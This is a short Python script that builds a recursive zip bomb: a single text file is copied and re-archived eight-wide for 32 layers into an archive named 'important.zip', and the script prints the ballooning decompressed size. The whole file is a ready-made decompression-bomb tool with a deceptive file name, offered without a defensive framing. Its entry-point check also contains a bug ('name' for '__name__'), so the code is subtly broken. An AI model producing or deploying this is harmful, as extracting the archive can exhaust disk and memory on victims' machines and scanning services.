import os
from shutil import copyfile, rmtree, make_archive


def bytes_2_human_readable(number_of_bytes):
    if number_of_bytes < 0:
        raise ValueError("!!! number_of_bytes can't be smaller than 0 !!!")

    step_to_greater_unit = 1024.

    number_of_bytes = float(number_of_bytes)
    unit = 'bytes'

    if (number_of_bytes / step_to_greater_unit) >= 1:
        number_of_bytes /= step_to_greater_unit
        unit = 'KB'

    if (number_of_bytes / step_to_greater_unit) >= 1:
        number_of_bytes /= step_to_greater_unit
        unit = 'MB'

    if (number_of_bytes / step_to_greater_unit) >= 1:
        number_of_bytes /= step_to_greater_unit
        unit = 'GB'

    if (number_of_bytes / step_to_greater_unit) >= 1:
        number_of_bytes /= step_to_greater_unit
        unit = 'TB'

    precision = 1
    number_of_bytes = round(number_of_bytes, precision)

    return str(number_of_bytes) + ' ' + unit


def create_zip(name, filename, content, width):
    if os.path.exists(name):
        rmtree(name)
    os.mkdir(name)

    filename = name + "/" + filename

    count = 0
    with open("{}{}.txt".format(filename, count), 'w') as f:
        f.write(content)

    payloadsize = width * os.path.getsize("{}0.txt".format(filename))

    while count < width - 1:
        count += 1
        copyfile("{}0.txt".format(filename), "{}{}.txt".format(filename, count))
    make_archive(name, "zip", name)

    rmtree(name)
    return payloadsize


def next_layer(folder, width):
    zipfile = folder + ".zip"
    if os.path.exists(folder):
        rmtree(folder)
    os.mkdir(folder)
    for i in range(width):
        copyfile(zipfile, "{}/{}{}.zip".format(folder, folder, i))
    os.remove(zipfile)
    make_archive(folder, "zip", folder)
    rmtree(folder)


def create_zipbomb(name, textfilename, content, width, depth):
    payloadSize = create_zip(name, textfilename, content, width)
    for i in range(depth):
        next_layer(name, width)
        zipSize = os.path.getsize("important.zip")
        payloadSize *= width
        print("Iteration {:3}: {:8} , payload {}".format(i, bytes_2_human_readable(zipSize),
                                                                    bytes_2_human_readable(payloadSize)))

if name=="__main__":
    create_zipbomb("important", "readme", "Pascal > Yannick", 8, 32)
